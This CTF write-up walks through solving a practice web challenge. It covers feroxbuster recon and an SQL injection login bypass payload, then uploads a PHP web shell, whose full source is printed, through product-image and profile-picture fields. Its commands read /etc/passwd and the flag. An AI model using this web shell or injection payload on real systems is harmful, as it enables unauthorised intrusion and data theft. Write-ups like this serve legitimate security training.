SecurityBoat CTF WriteUp - Jan 2024
Link for CTF: http://ctf.securityboat.net/
Recon:
Without Login :
I tried to access the robot.txt and robots.txt but there is not file to found.

2. I tried brute forcing the URL with feroxbuster.
feroxbuster -u http://ctf.securityboat.net/
Three folders that got my interest were admin, JS, assets.
With Login:
Register to the site with admin.

2. Then I login with admin11 and 123456789 as password.
3. After that it redirect to http://ctf.securityboat.net/admin/dashboard.html.
4. We can also bypass the login panel using SQLi Injection. To get admin dashboard.
Payload used for SQLi
admin' or '1'='1
5. Got Access to admin panel
Exploitation:
I checked all options in admin dash board I got only some parameter like description and name that are vulnerable to XSS attacks and Image to upload for products.

2. For Normal user I got only profile pic to upload the image.
3. There are 2 Options for us to upload products image in admin panel and profile pic in Normal user one.
To get the Flag there are two ways with:
Normal User(File Upload via Profile Pic)
Admin User(File Upload via edit option in products)

So these two are only option for us to get flag.
Admin User:
I uploaded PHP reverse shell in the Image option in products

Admin|Edit-Products
Edit descriptionctf.securityboat.net
2. Find that this PHP reverse shell got uploaded into "products" directory.
http://ctf.securityboat.net/assets/products/payload.php
3. Lets Enumerate the system
http://ctf.securityboat.net/assets/products/payload.php?cmd=pwd
http://ctf.securityboat.net/assets/products/payload.php?cmd=cat%20/etc/passwd
http://ctf.securityboat.net/assets/products/payload.php?cmd=cd%20/home;ls
http://ctf.securityboat.net/assets/products/payload.php?cmd=cat%20/home/flag.txt
Flag is
{Unrestr!cted_F!le_Upload_!s_Fun}
Normal User:
I uploaded PHP reverse shell in profile pic.

http://ctf.securityboat.net/profile.html
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
2. Find that this PHP reverse shell got uploaded into assets/profPic/
http://ctf.securityboat.net/assets/profPic/payload.php
3. Now lets find the flag now.
4. using the above shell let's enumerate the system.
http://ctf.securityboat.net/assets/profPic/payload.php?cmd=cat%20/etc/passwd
http://ctf.securityboat.net/assets/profPic/payload.php?cmd=cd%20/home;ls
http://ctf.securityboat.net/assets/profPic/payload.php?cmd=cat%20/home/flag.txt
Flag is
{Unrestr!cted_F!le_Upload_!s_Fun}
